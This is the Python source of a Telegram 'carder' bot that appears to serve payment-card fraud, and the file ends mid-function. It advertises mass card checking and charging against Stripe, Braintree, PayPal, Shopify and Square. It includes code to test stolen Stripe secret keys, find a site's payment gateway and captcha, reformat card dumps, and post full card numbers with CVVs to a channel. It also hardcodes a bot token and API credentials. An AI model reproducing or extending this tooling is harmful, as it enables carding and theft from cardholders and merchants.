# --- Standard Libraries ---
import os
import sys
import re
import time
from datetime import datetime
import json
import time
import asyncio
import re
import time
from pyrogram import Client, filters
from pyrogram.errors import ChannelPrivate, UsernameNotOccupied

import random
import string
import telebot
import requests
from datetime import datetime, timedelta
import random
import re
import logging
import random
from pyrogram import Client, filters
from datetime import datetime, timedelta
from datetime import datetime
from urllib.parse import urlparse
import platform
import zipfile
import io
from datetime import timedelta

# --- Third-Party Libraries ---
import requests
from bs4 import BeautifulSoup
import telebot
import requests
from bs4 import BeautifulSoup
from PIL import Image, ImageDraw, ImageFont
import io
from telebot import types
from telebot.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
import psutil
from PIL import Image, ImageDraw, ImageFont


# === Configuration ===
BOT_TOKEN = "8150157942:AAGnuFbZEzN1lAyDmTkzyOpjGHVBxsXrZYI"
CHANNEL_ID = "@DARKKIMOP"  # Or use channel ID with -100 prefix
# ========== CONFIGURATION ==========
BOT_TOKEN = '8150157942:AAGnuFbZEzN1lAyDmTkzyOpjGHVBxsXrZYI'
ADMIN_ID = 8179218740  # Replace with your admin Telegram user ID
CHANNEL_USERNAME = '@DARKKIMOP'  # Replace with your channel username for /verify
token = "8150157942:AAGnuFbZEzN1lAyDmTkzyOpjGHVBxsXrZYI" 
bot=telebot.TeleBot(token,parse_mode="HTML")
owners = ["8179218740", "8179218740"]
YOUR_ADMIN_ID = "8179218740"
bot = telebot.TeleBot(BOT_TOKEN)
# ========== IN-MEMORY STORAGE ==========
authorized_users = {}  # user_id: expiry_timestamp
promo_codes = {}       # code: duration_days
free_claims = {}       # user_id: last_claim_time
valid_redeem_codes = {}
get_registered_users = {}
AUTHORIZED_USERS = {}
#=========================================#
API_ID = 23926288
API_HASH = "f28e483ec0c47508d896e0311fbfcf3d"
BOT_TOKEN = "8150157942:AAGnuFbZEzN1lAyDmTkzyOpjGHVBxsXrZYI"
#==================================#

# Replace with your actual bot token
TOKEN = '8150157942:AAGnuFbZEzN1lAyDmTkzyOpjGHVBxsXrZYI'
bot = telebot.TeleBot(TOKEN)
#====================================================
API_TOKEN = '8150157942:AAGnuFbZEzN1lAyDmTkzyOpjGHVBxsXrZYI'
bot = telebot.TeleBot(API_TOKEN)
# Function to handle the /start command
@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Create an inline keyboard with four buttons
    markup = types.InlineKeyboardMarkup()

    # Add buttons for different options
    button_gateway = types.InlineKeyboardButton("⚡ Gateway", callback_data="gateway")
    button_charged = types.InlineKeyboardButton("💳 Charged", callback_data="charged")
    button_tools = types.InlineKeyboardButton("🛠 Tools", callback_data="tools")
    button_owner = types.InlineKeyboardButton("👮 Owner", callback_data="owner")

    # Add buttons to the markup
    markup.add(button_gateway, button_charged)
    markup.add(button_tools, button_owner)

    # Send the welcome message with the buttons
    bot.send_message(
        message.chat.id,
        """🟢 [ 𝐌𝐔𝐒𝐓𝐀𝐅𝐀 𝐱 𝐂𝐀𝐑𝐃𝐄𝐑 𝐁𝐎𝐎𝐓𝐈𝐍𝐆... ]

> Establishing secure tunnel...
> Encrypting traffic...
> Spoofing identity...
> Loading carding modules... ✔

💳 System Ready.  
⚡ Choose an option to proceed.""",
        reply_markup=markup
    )



# Handle callback data when a user presses a button
@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call):
    # Check if the user clicked the "Back" button
    if call.data == "back":
        # Rebuild the initial menu (sending it in the same chat)
        markup = types.InlineKeyboardMarkup()
        button_gateway = types.InlineKeyboardButton("⚡ Gateway", callback_data="gateway")
        button_charged = types.InlineKeyboardButton("💳 Charged", callback_data="charged")
        button_tools = types.InlineKeyboardButton("🛠 Tools", callback_data="tools")
        button_owner = types.InlineKeyboardButton("👮 Owner", callback_data="owner")

        # Add buttons to the markup
        markup.add(button_gateway, button_charged)
        markup.add(button_tools, button_owner)

        # Edit the message to return to the main menu
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="🟢 𝐌𝐔𝐒𝐓𝐀𝐅𝐀 𝐗 𝐂𝐀𝐑𝐃𝐄𝐑 initialized — secure shell active. 💳 Choose your operation below.", reply_markup=markup)

    elif call.data == "gateway":
        # Send the "Auth Commands" text for the "Gateway" option
        gateway_text = '''Auth Commands:

┏━━━━━[ Auth Base ]━━━━┓

  ⋆————✰◦STRIPE◦✰————⋆
            
• CMD :  /chk  -  [Single]
• NAME : Stripe Auth
• STARUS : Active ✅

• CMD : /mchk - [Mass]
• NAME : Mass Stripe Auth 
• STATUS : Active ✅

 ⋆————✰◦STRIPE2◦✰————⋆
            
• CMD :  /au  -  [Single]
• NAME : Stripe Auth 2
• STARUS : Off 

• CMD : /mass - [Mass]
• NAME : Mass Stripe Auth 2
• STATUS : Off 

 ⋆———✰◦BRAINTREE◦✰———⋆
             
• CMD :  /b3  -  [Single]
• NAME : Braintree Auth
• STARUS : Active ✅

• CMD : /b3  - [Mass]
• NAME : Mass Braintree Auth
• STATUS : Active ✅

⋆————✰◦PAYPAL◦✰————⋆
             
• CMD :  /pp  -  [Single]
• NAME : Paypal Auth + CCN
• STARUS : Off ✅

• CMD : /mpp  - [Mass]
• NAME : Mass Paypal Auth
• STATUS : Off ✅

 ⋆———✰◦BRAINTREE◦✰———⋆
             
• CMD :  /vbv  -  [Single]
• NAME : 3DS Lookup 
• STARUS : Active ✅

• CMD : /mvbv  - [Mass]
• NAME : Mass 3DS Lookup
• STATUS : Active ✅

┗━━━━━━━━━━━━━━━━━┛'''
        
        # Create a back button
        back_button = types.InlineKeyboardButton("🔙 Back", callback_data="back")
        markup = types.InlineKeyboardMarkup()
        markup.add(back_button)

        # Edit the message with the new content and back button
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=gateway_text, reply_markup=markup)
    
    elif call.data == "charged":
        # Send the "Charged Commands" text for the "Charged" option
        charged_text = '''Charged Commands:

┏━━━━━[Charge Base]━━━━┓

⋆————✰◦SHOPIFY◦✰————⋆
             
• CMD : /sh  -  [Single]
• NAME : Shopify+ GraphQL 
• CHARGE : 10$ 🔥
• STATUS : Active ✅

• CMD : /msh  -  [Mass]
• NAME : Shopify+ Graphql 
• CHARGE : 10$ 🔥
• STATUS : Active ✅

⋆————✰◦SHOPIFY◦✰————⋆

• CMD : /sho  -  [Single]
• NAME : Shopify Charge
• CHARGE : 27.8$ 🔥
• STATUS : Off

• CMD : /msho  -  [Mass]
• NAME : Mass Shopify Charge
• CHARGE : 27.8$ 🔥
• STATUS : Off

⋆————✰◦SITEBASE◦✰————⋆
            
• CMD :  /cc  -  [Single]
• NAME : Site Based 
• CHARGE : 1$ 🔥
• STARUS : Active ✅

• CMD : /mcc  - [Mass]
• NAME : Mass Site Based
• CHARGE : 1$ 🔥
• STATUS : Active ✅

⋆————✰◦SITEBASE◦✰————⋆
            
• CMD :  /mx  -  [Single]
• NAME : Site Based 
• CHARGE : 5$ 🔥
• STARUS : Active ✅

• CMD : /mmx  - [Mass]
• NAME : Mass Site Based
• CHARGE : 5$ 🔥
• STATUS : Active ✅

 ⋆————✰◦SQUARE◦✰————⋆
             
• CMD :  /sq  -  [Single]
• NAME : Stripe + Square
• CHARGE : 0.20$ 🔥
• STARUS : Active ✅

• CMD : /msq  - [Mass]
• NAME : Mass Stripe + Square
• CHARGE : 0.20$ 🔥
• STATUS : Active ✅

⋆————✰◦PAYPAL◦✰————⋆
             
• CMD :  /pp  -  [Single]
• NAME : Paypal Auth + Charge 
• CHARGE : 1$ 🔥
• STARUS : Active ✅

• CMD : /mpp  - [Mass]
• NAME : Mass Paypal Charge 
• CHARGE : 1$ 🔥
• STATUS : Active ✅

┗━━━━━━━━━━━━━━━━━┛'''
        
        # Create a back button
        back_button = types.InlineKeyboardButton("🔙 Back", callback_data="back")
        markup = types.InlineKeyboardMarkup()
        markup.add(back_button)

        # Edit the message with the new content and back button
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=charged_text, reply_markup=markup)

    elif call.data == "tools":
        # Send the "Tools" text for the "Tools" option
        tools_text = '''⋆————✰◦TOOLS◦✰————⋆
            
• CMD :  /bin  -  
• NAME : Do bin lookup
• STARUS : Active ✅

• CMD : /gen - 
• NAME : Generate Ccs
• STATUS : Active ✅

• CMD : /gate - 
• NAME : Find Gate Of any website
• STATUS : Active ✅

• CMD : /fake - 
• NAME : Generate Fake Address
• STATUS : Active ✅

• CMD : /info - 
• NAME : Show User Info
• STATUS : Active ✅

• CMD : /ping - 
• NAME : Show Bot Status
• STATUS : Active ✅

• CMD : /open - 
• NAME : Open Text File
• STATUS : Active ✅

• CMD : /split - 
• NAME : Split text file into many parts
• STATUS : Active ✅

• CMD : /true - 
• NAME : Phone number info 
• STATUS : Active ✅

• CMD : /sk - 
• NAME : Sk key info
• STATUS : Active ✅

• CMD : /pk - 
• NAME : Pk key info
• STATUS : Active ✅

• CMD : /img - 
• NAME : Generate Image
• STATUS : Active ✅

• CMD : /fl - 
• NAME : Filter Jumbled CC into corrrect format
• STATUS : Active ✅

• CMD : /redeem - 
• NAME : Redeem Codes
• STATUS : Active ✅

• CMD : /prochk - 
• NAME : Check Proxies 
• STATUS : Active ✅

• CMD : /lk - 
• NAME : Validation of Card
• STATUS : Active ✅

• CMD : /balance - 
• NAME : User Plan Info
• STATUS : Active ✅

• CMD : /help - 
• NAME : Report Any Issue
• STATUS : Active ✅

• CMD : /cmds - 
• NAME : Show Available CMDS 
• STATUS : Active ✅

┗━━━━━━━━━━━━━━━━━┛'''
        
        # Create a back button
        back_button = types.InlineKeyboardButton("🔙 Back", callback_data="back")
        markup = types.InlineKeyboardMarkup()
        markup.add(back_button)

        # Edit the message with the new content and back button
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=tools_text, reply_markup=markup)

    elif call.data == "owner":
        # Send message for "Owner" option
        bot.send_message(call.message.chat.id, "you can contact the owner... owner's username is @SLAYER_OP7")

BIN_API_URL = "https://lookup.binlist.net/"  # no comma

def get_flag(country_code):
    """Return flag emoji from country code."""
    if not country_code:
        return "🏳️"
    return "".join([chr(127397 + ord(c)) for c in country_code.upper()])

@bot.message_handler(commands=["bin"])
def bin_command(message):
    try:
        args = message.text.split(" ")
        if len(args) < 2:
            bot.reply_to(message, "❌ <b>Usage:</b> <code>/bin 457173</code>\n\n⚠️ Please enter a valid BIN number.", parse_mode="HTML")
            return
        
        bin_number = args[1].strip()
        
        # Fetch BIN details
        response = requests.get(f"{BIN_API_URL}{bin_number}")
        
        if response.status_code != 200:
            bot.reply_to(message, "❌ <b>Error:</b> Invalid or unknown BIN. Please try another.", parse_mode="HTML")
            return

        bin_info = response.json()
        
        country = bin_info.get("country", {})
        bank = bin_info.get("bank", {})

        country_flag = get_flag(country.get("alpha2", ""))
        
        # Get current timestamp
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

        # Premium-styled output
        reply_text = f"""
<b>━━━━━━━━━━━ [  🔍 BIN Lookup  ] ━━━━━━━━━━━</b>

<b>💳 BIN:</b> <code>{bin_number}</code>
<b>🏦 Bank:</b> <code>{bank.get('name', 'Unknown')}</code>
<b>🌍 Country:</b> <code>{country.get('name', 'Unknown')}</code> {country_flag}
<b>💰 Currency:</b> <code>{country.get('currency', 'N/A')}</code>
<b>💳 Card Type:</b> <code>{bin_info.get('type', 'N/A')}</code>
<b>🔄 Brand:</b> <code>{bin_info.get('scheme', 'N/A')}</code>
<b>🏷️ Prepaid:</b> <code>{'Yes ✅' if bin_info.get('prepaid') else 'No ❌'}</code>

<b>━━━━━━━━━━━ [  👤 User Info  ] ━━━━━━━━━━━</b>

<b>👤 Checked by:</b> <code>{message.from_user.first_name}</code>
<b>🕒 Timestamp:</b> <code>{timestamp}</code>

<b>━━━━━━━━━━━ [  🚀 Powered By  ] ━━━━━━━━━━━</b>
<i>🔹 𝐌𝐔𝐒𝐓𝐀𝐅𝐀 𝐂𝐀𝐑𝐃𝐄𝐑 – 𝐏𝐑𝐄𝐌𝐈𝐔𝐍 𝐁𝐈𝐍 𝐋𝐎𝐎𝐊𝐔𝐏 🔹</i>
"""
        bot.reply_to(message, reply_text, parse_mode="HTML", disable_web_page_preview=True)

    except Exception as e:
        bot.reply_to(message, f"❌ <b>Error:</b> <code>{str(e)}</code>", parse_mode="HTML")


@bot.message_handler(commands=['gate'])
def check_gateway(message):
    # Check if the user has provided a URL after the command
    if len(message.text.split()) < 2:
        bot.reply_to(message, "❌ Please provide a URL after the /gate command. Example: /gate https://example.com")
        return
    
    # Extract the URL provided by the user
    url = message.text.split(' ', 1)[1]  # Get URL after "/gate"
    
    # Check if the URL is valid (simple check)
    if not url.startswith("http"):
        bot.reply_to(message, "❌ Invalid URL! Please make sure the URL starts with http:// or https://")
        return
    
    try:
        # Send a request to the provided URL
        response = requests.get(url, timeout=10)
        
        if response.status_code != 200:
            bot.reply_to(message, f"❌ Failed to fetch the site. Status code: {response.status_code}")
            return
        
        # Parse the page for additional info (like captcha detection)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Look for common captcha identifiers
        captcha = 'No captcha detected'
        if soup.find('div', {'id': 'captcha'}) or soup.find('iframe', {'src': 'captcha'}):
            captcha = 'Captcha detected'
        elif soup.find('script', {'src': 'https://www.google.com/recaptcha/api.js'}):
            captcha = 'Google reCAPTCHA detected'
        
        # Check for Cloudflare protection
        cloudflare = 'None'
        if soup.find('title', text='Checking your browser...'):
            cloudflare = 'Cloudflare detected'
        
        # Check for 3D Secure (3DS) indicator
        security_3ds = 'No 3D Secure detected'
        if '3D Secure' in soup.text or '3ds' in soup.text.lower():
            security_3ds = '3D Secure (3DS) detected'

        # Look for different payment gateway mentions
        gateways = []
        if 'Stripe' in soup.text:
            gateways.append('Stripe')
        if 'Square' in soup.text:
            gateways.append('Square')
        if 'PayPal' in soup.text:
            gateways.append('PayPal')
        if 'Woocommerce' in soup.text:
            gateways.append('Woocommerce')
        if 'Klarna' in soup.text:
            gateways.append('Klarna')
        if 'Afterpay' in soup.text:
            gateways.append('Afterpay')
        if 'Braintree' in soup.text:
            gateways.append('Braintree')
        if 'Adyen' in soup.text:
            gateways.append('Adyen')
        if 'Apple Pay' in soup.text:
            gateways.append('Apple Pay')
        if 'Google Pay' in soup.text:
            gateways.append('Google Pay')
        if 'Amazon Pay' in soup.text:
            gateways.append('Amazon Pay')
        if 'Alipay' in soup.text:
            gateways.append('Alipay')
        if 'WeChat Pay' in soup.text:
            gateways.append('WeChat Pay')
        if 'Payoneer' in soup.text:
            gateways.append('Payoneer')
        if 'Skrill' in soup.text:
            gateways.append('Skrill')
        if '2Checkout' in soup.text:
            gateways.append('2Checkout')
        if 'Authorize.Net' in soup.text:
            gateways.append('Authorize.Net')
        if 'Worldpay' in soup.text:
            gateways.append('Worldpay')
        if 'Razorpay' in soup.text:
            gateways.append('Razorpay')
        
        gateway_info = ', '.join(gateways) if gateways else 'No specific payment gateways found'
        
        # Send the result back to the user
        reply = f"""
        ┏━━━━━━━⍟
        ┃ 𝗟𝗼𝗼𝗸𝘂𝗽 𝗥𝗲𝘀𝘂𝗹𝘁 : ✅
        ┗━━━━━━━━━━━━⊛
        ─━─━─━─━─━─━─━─━─━─
        ➥ 𝗦𝗶𝘁𝗲 -» {url}
        ➥ 𝗣𝗮𝘆𝗺𝗲𝗻𝘁 𝗚𝗮𝘁𝗲𝘄𝗮𝘆𝘀 -» {gateway_info}
        ➥ 𝗖𝗮𝗽𝘁𝗰𝗵𝗮 -» {captcha}
        ➥ 𝗖𝗹𝗼𝗨𝗳𝗹𝗮𝗿𝗲 -» {cloudflare}
        ➥ 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 -» {security_3ds}
        ➥ 𝗖𝗩𝗩/𝗖𝗩𝗖 -» N/A
        ➥ 𝗜𝗻𝗯𝘂𝗶𝗹𝘁 𝗦𝘆𝘀𝘁𝗲𝗺 -» N/A
        ➥ 𝗦𝗧𝗔𝗧𝗨𝗦 -» {response.status_code}
        ─━─━─━─━─━─━─━─━─━─
        """
        
        bot.reply_to(message, reply)
    
    except requests.exceptions.RequestException as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")


def check_sk_key(sk_key):
    try:
        headers = {
            "Authorization": f"Bearer {sk_key}"
        }
        response = requests.get("https://api.stripe.com/v1/account", headers=headers)
        if response.status_code == 200:
            data = response.json()
            result = f"""
┏━━━━━━━⍟
┃ SK Key Info
┗━━━━━━━━━━━⊛

✧ Name        : {data.get('business_profile', {}).get('name', 'N/A')}
✧ Business    : {data.get('business_profile', {}).get('mcc', 'N/A')}
✧ Website     : {data.get('business_profile', {}).get('url', 'N/A')}
✧ Email       : {data.get('email', 'N/A')}
✧ Country     : {data.get('country', 'N/A')}
✧ Currency    : {data.get('currency', 'N/A')}
✧ Live Mode   : {'✅' if data.get('livemode', False) else '❌'}
✧ Status      : ✅ LIVE
"""
        else:
            result = f"❌ Invalid or dead SK key.\nStatus: {response.status_code} - {response.text}"
    except Exception as e:
        result = f"⚠️ Error checking key: {e}"
    return result

@bot.message_handler(commands=['sk'])
def handle_sk(message):
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "❗Usage: /sk <sk_live_xxx>")
        return

    sk_key = args[1]
    if not sk_key.startswith("sk_live_"):
        bot.reply_to(message, "❗That doesn't look like a valid live SK key.")
        return

    msg = bot.reply_to(message, "🔍 Checking key...")
    result = check_sk_key(sk_key)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text=result)

    # Regex to extract CC|MM|YY|CVV from messy/jumbled text
def extract_cc_format(text):
    lines = text.splitlines()
    formatted = []
    for line in lines:
        digits = re.findall(r'\d+', line)
        if len(digits) >= 4:
            cc = next((d for d in digits if len(d) == 16), None)
            mm = next((d for d in digits if 1 <= int(d) <= 12 and len(d) in [1, 2]), None)
            yy = next((d for d in digits if 24 <= int(d[-2:]) <= 35 and len(d) in [2, 4]), None)
            cvv = next((d for d in digits if len(d) in [3, 4] and d != yy and d != mm), None)
            if cc and mm and yy and cvv:
                yy = yy[-2:]  # shorten 2025 → 25
                mm = mm.zfill(2)  # pad 2 → 02
                formatted.append(f"{cc}|{mm}|{yy}|{cvv}")
    return formatted

@bot.message_handler(commands=['fl'])
def format_jumbled_cc(message):
    msg = message.reply_to_message.text if message.reply_to_message else message.text[3:].strip()
    if not msg:
        bot.reply_to(message, "❗ Send jumbled cards after /fl or reply to the message containing them.")
        return

    result = extract_cc_format(msg)
    if not result:
        bot.reply_to(message, "⚠️ Couldn't detect any valid CC data.")
    else:
        bot.reply_to(message, "✅ Formatted:\n" + "\n".join(result))

         # === BIN info lookup ===
def get_bin_info(bin_code):
    try:
        res = requests.get(f"https://lookup.binlist.net/{bin_code}")
        data = res.json()
        bank = data.get("bank", {}).get("name", "Unknown Bank")
        card_type = data.get("scheme", "UNKNOWN").upper() + " - " + data.get("type", "UNKNOWN").upper()
        country = data.get("country", {}).get("name", "Unknown Country") + " " + data.get("country", {}).get("emoji", "")
        return bank, card_type, country
    except:
        return "Unknown Bank", "Unknown Type", "Unknown Country"

# === Format and send to channel ===
def format_cc_message(cc):
    try:
        ccnum, mm, yy, cvv = cc.split("|")
        masked = ccnum[:12] + "xxxx"
        bin_code = ccnum[:6]
        bank, card_type, country = get_bin_info(bin_code)

        message = f"""✜━━━━━━━━━━━━━━━━━━━━✜
[✜] CC: {ccnum}|{mm}|{yy}|{cvv}
[✜] EXTRAP: {masked}|{mm}|{yy}
[✜] CC: {ccnum}
-----------------------------
[✜] Auth : Your card is approved.
[✜] 3DS : Authenticate Attempt Successful ✅
-----------------------------
[✜] BIN: #{bin_code}
[✜] BANK: {bank}
[✜] DATA: {card_type}
[✜] COUNTRY: {country}
✜━━━━━━━━━━━━━━━━━━━━✜"""
        return message
    except Exception as e:
        return f"❌ Invalid CC format. Use CC|MM|YYYY|CVV\nError: {e}"

# === Image generator ===
def generate_card_image(ccnum, mm, yy, cvv):
    image = Image.new("RGB", (640, 400), color="#1e1e2e")
    draw = ImageDraw.Draw(image)
    font_large = ImageFont.truetype("arial.ttf", 28)
    font_small = ImageFont.truetype("arial.ttf", 20)

    # Draw info
    draw.text((40, 50), f"Card Number: {ccnum}", fill="white", font=font_large)
    draw.text((40, 120), f"Expiry: {mm}/{yy}", fill="white", font=font_small)
    draw.text((40, 160), f"CVV: {cvv}", fill="white", font=font_small)

    # Save to BytesIO
    buffer = io.BytesIO()
    image.save(buffer, format="PNG")
    buffer.seek(0)
    return buffer

# === /sendcc command ===
@bot.message_handler(commands=['sendcc'])
def handle_sendcc(message):
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Usage: /sendcc CC|MM|YYYY|CVV")
        return
    cc_input = message.text.split(maxsplit=1)[1]
    formatted_msg = format_cc_message(cc_input)
    bot.send_message(CHANNEL_ID, formatted_msg)
    bot.reply_to(message, "✅ Sent to channel.")

# === /charged command ===
@bot.message_handler(commands=['charged'])
def handle_charged(message):
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Usage: /charged CC|MM|YYYY|CVV Amount")
        return
    try:
        # Get the user input and split it into card details and amount
        cc_input = message.text.split(maxsplit=1)[1]
        
        # Check if there's a space to split between card details and amount
        if ' ' not in cc_input:
            raise ValueError("Missing amount. Ensure format is CC|MM|YYYY|CVV Amount")

        cc_details, amount = cc_input.rsplit(" ", 1)  # Split at the last space to separate amount
        ccnum, mm, yy, cvv = cc_details.strip().split("|")

        # Mask the card number for security
        masked = ccnum[:12] + "xxxx"
        bin_code = ccnum[:6]
        bank, card_type, country = get_bin_info(bin_code)

        # Format the message
        message = f"""✜━━━━━━━━━━━━━━━━━━━━✜
[✜] CC: {ccnum}|{mm}|{yy}|{cvv}
[✜] EXTRAP: {masked}|{mm}|{yy}
[✜] CC: {ccnum}
-----------------------------
[✜] Auth : Card Charged Successfully ✅
[✜] Amount: {amount}$
-----------------------------
[✜] BIN: #{bin_code}
[✜] BANK: {bank}
[✜] DATA: {card_type}
[✜] COUNTRY: {country}
✜━━━━━━━━━━━━━━━━━━━━✜"""

        # Send the message to the channel
        bot.send_message(CHANNEL_ID, message)
        bot.reply_to(message, f"✅ Card Charged: {amount}$")
    except ValueError as e:
        bot.reply_to(message, f"❌ Error: {e}\nEnsure format is CC|MM|YYYY|CVV Amount")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}\nEnsure format is CC|MM|YYYY|CVV Amount")


@bot.message_handler(commands=['genimg'])
def handle_genimg(message):
    if len(message.text.split()) < 2:
        bot.reply_to(message, "Usage: /genimg CC|MM|YYYY|CVV")
        return
    try:
        cc_input = message.text.split(maxsplit=1)[1]
        ccnum, mm, yy, cvv = cc_input.strip().split("|")
        img = generate_card_image(ccnum, mm, yy, cvv)  # 🛠 Corrected line
        bot.send_photo(message.chat.id, img, caption="🖼️ Here is your card image.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}\nMake sure format is CC|MM|YYYY|CVV")


        # Track bot start time
start_time = time.time()

# Load users from file or list (modify based on your bot setup)
def get_total_users():
    try:
        with open("users.txt", "r") as f:
            return len(set(f.readlines()))
    except:
        return 0
@bot.message_handler(commands=['ping'])
def handle_ping(message):
    ping_start = time.time()
    msg = bot.send_message(message.chat.id, "⚡ Checking status...")
    ping_time = int((time.time() - ping_start) * 1000)

    # Uptime
    uptime_seconds = int(time.time() - start_time)
    uptime = str(timedelta(seconds=uptime_seconds))

    # System info
    cpu_usage = psutil.cpu_percent()
    ram_usage = psutil.virtual_memory().percent
    system_info = platform.system() + " (" + platform.machine() + ")"
    total_users = get_total_users()

    # Stylish status message
    status = f"""<b> ✦ Isagi Carder bot ✦ is running...</b>

✧ <b>Ping:</b> <code>{ping_time} ms</code>
✧ <b>Up Time:</b>  <code>{uptime}</code>
✧ <b>CPU Usage:</b> <code>{cpu_usage}%</code>
✧ <b>RAM Usage:</b> <code>{ram_usage}%</code>
✧ <b>System:</b> <code>{system_info}</code>
✧ <b>Total Users:</b> <code>{total_users}</code>

✧ <b>Bot By:</b> <a href='https://t.me/SLAYER_OP7'>@SLAYER_OP7</a>
"""
    bot.edit_message_text(status, chat_id=msg.chat.id, message_id=msg.message_id, parse_mode="HTML", disable_web_page_preview=True)
    # ✅ Admin User IDs (Replace with actual admin Telegram IDs)
ADMINS = ["8179218740", "8179218740"]

# ✅ Credits Storage File
CREDITS_FILE = "user_credits.json"

# ✅ Function to Load or Fix `user_credits.json`
def load_credits():
    if not os.path.exists(CREDITS_FILE):
        with open(CREDITS_FILE, "w") as f:
            json.dump({}, f, indent=4)

    try:
        with open(CREDITS_FILE, "r") as f:
            data = f.read().strip()
            return json.loads(data) if data else {}  # ✅ Return {} if file is empty
    except (json.JSONDecodeError, ValueError):  # ✅ Reset if corrupted
        with open(CREDITS_FILE, "w") as f:
            json.dump({}, f, indent=4)
        return {}

# ✅ Function to Save Credits Securely
def save_credits(credits):
    with open(CREDITS_FILE, "w") as f:
        json.dump(credits, f, indent=4)

# ✅ Function to Get User Balance
def get_balance(user_id):
    credits = load_credits()
    return credits.get(str(user_id), 0)

# ✅ Function to Deduct Credits (Secure)
def deduct_credits(user_id, amount):
    credits = load_credits()
    user_id = str(user_id)

    if credits.get(user_id, 0) >= amount:  # ✅ Ensure user has enough credits
        credits[user_id] -= amount
        save_credits(credits)
        return True
    return False  # ✅ Return False if not enough credits

# ✅ Function to Add Credits
def add_credits(user_id, amount):
    credits = load_credits()
    user_id = str(user_id)

    credits[user_id] = credits.get(user_id, 0) + amount  # ✅ Ensure balance updates correctly
    save_credits(credits)  # ✅ Save updated balance

    notify_user(user_id, amount)  # ✅ Notify user

# ✅ Function to Notify User When Credits Are Added
def notify_user(user_id, amount):
    bot.send_message(user_id, f"""
🎉 <b>💎 VIP Credits Added!</b>  
━━━━━━━━━━━━━━  
💰 <b>+{amount} Credits</b> added to your balance.  
💳 <b>New Balance:</b> {get_balance(user_id)} Credits  
━━━━━━━━━━━━━━  
🚀 <b>Use Your Credits Now!</b>  
""", parse_mode="HTML")
# === Simulated VBV check (replace with actual API call) ===
def perform_vbv_check(card):
    try:
        cc, mm, yy, cvv = card.strip().split('|')
        # Simulate API lookup
        response = {
            'status': 'success',
            'vbv': '✅ 3DS Enrolled',
            'bank': 'Bank of Test',
            'scheme': 'Visa',
            'type': 'Credit'
        }
        # Simulate delay
        time.sleep(1)
        return f"""💳 Card: {cc}|{mm}|{yy}|{cvv}
🏦 Bank: {response['bank']}
💳 Type: {response['type']}
📶 Scheme: {response['scheme']}
🔒 VBV: {response['vbv']}
"""
    except:
        return f"❌ Invalid format: {card}"

# === /vbv command ===
@bot.message_handler(commands=['vbv'])
def handle_vbv(message):
    if len(message.text.split()) < 2:
        return bot.reply_to(message, "Usage:\n/vbv <card>")
    card = message.text.split(None, 1)[1]
    result = perform_vbv_check(card)
    bot.reply_to(message, result)

# === /mvbv command ===
@bot.message_handler(commands=['mvbv'])
def handle_mvbv(message):
    msg = bot.reply_to(message, "📥 Send the card list (format: `cc|mm|yy|cvv`, one per line):")
    bot.register_next_step_handler(msg, process_bulk_vbv)

def process_bulk_vbv(message):
    cards = message.text.strip().split('\n')
    bot.send_message(message.chat.id, f"🧪 Starting 3DS checks for {len(cards)} cards...")
    results = []
    for card in cards:
        result = perform_vbv_check(card)
        results.append(result)
    # Send results in chunks
    chunk = ""
    for r in results:
        if len(chunk + r) > 4000:
            bot.send_message(message.chat.id, chunk)
            chunk = ""
        chunk += r + "\n"
    if chunk:
        bot.send_message(message.chat.id, chunk)

# ✅ `/addcredits` Command for Admins (Add Credits to User)
@bot.message_handler(commands=["addcredits"])
def add_user_credits(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "🚫 <b>Access Denied!</b> You are not authorized to add credits.", parse_mode="HTML")
        return

    try:
        command_parts = message.text.split()
        if len(command_parts) != 3:
            raise ValueError("Invalid command format")

        _, user_id, amount = command_parts

        if not user_id.isdigit():
            raise ValueError("User ID must be a number")

        user_id = str(user_id)
        amount = int(amount)

        add_credits(user_id, amount)
        new_balance = get_balance(user_id)

        bot.reply_to(message, f"✅ <b>Success!</b> Added {amount} credits to user <code>{user_id}</code>. New balance: {new_balance} Credits.", parse_mode="HTML")
        bot.send_message(user_id, f"🎉 <b>Credits Added!</b>\n💰 <b>+{amount} Credits</b>\n💳 <b>New Balance:</b> {new_balance} Credits", parse_mode="HTML")

    except ValueError:
        bot.reply_to(message, "⚠️ <b>Invalid Format!</b> Use <code>/addcredits user_id amount</code>", parse_mode="HTML")
    except Exception as e:
        bot.reply_to(message, f"❌ <b>Error:</b> {str(e)}", parse_mode="HTML")

 # Function to check proxy
def check_proxy(proxy):
    try:
        response = requests.get('https://httpbin.org/ip', proxies={"http": proxy, "https": proxy}, timeout=10)
        if response.status_code == 200:
            return f"Proxy is working! Your IP: {response.json()['origin']}"
        else:
            return "Proxy is not working. Status code: " + str(response.status_code)
    except requests.exceptions.RequestException as e:
        return f"Error checking proxy: {e}"

# /prochk command
@bot.message_handler(commands=['prochk'])
def handle_prochk(message):
    # Prompt user for proxy input
    msg = bot.send_message(message.chat.id, "Please provide the proxy in the format 'http://username:password@ip:port' or 'http://ip:port'")
    bot.register_next_step_handler(msg, process_proxy)

# Process provided proxy
def process_proxy(message):
    proxy = message.text.strip()
    if not proxy:
        bot.reply_to(message, "No proxy provided. Please provide a valid proxy.")
        return

    # Check proxy
    result = check_proxy(proxy)
    bot.reply_to(message, result)

# ✅ `/balance` Command to Show User's Balance
@bot.message_handler(commands=["balance"])
def check_balance(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or message.from_user.first_name
    balance = get_balance(user_id)

    bot.reply_to(message, f"""
💰 <b>💎 VIP Balance Dashboard 💎</b>  
━━━━━━━━━━━━━━  
